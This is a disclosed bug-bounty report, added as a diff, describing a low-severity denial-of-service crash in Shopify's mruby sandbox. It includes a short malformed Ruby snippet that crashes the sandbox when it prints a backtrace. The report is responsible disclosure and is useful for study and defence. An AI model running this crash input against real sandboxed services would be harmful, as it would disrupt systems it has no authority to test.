@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/204047
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/dgaletic
+ReportedTo:shopify-scripts(shopify-scripts)
+BountyAmount:1000.0
+Severity:low
+State:Closed
+DateOfDisclosure:14.03.2017 21:11:22
+
+Summary:
+
+The code below crashes the sandbox/mruby as it tries to print the backtrace. Incidentally, it does not crash mirb.
+```
+def foo(n)
+  return '\' 
+  if n \n' ensure % 
+  if:n != if n == -1110
+  else foo(n-1).%  
+  end
+end %foo(0)
+```
+
+We are still examining the bug and hope to produce a detailed analysis and a fix this week.
+
+Thank you,
+Dinko Galetic
+Denis Kasak
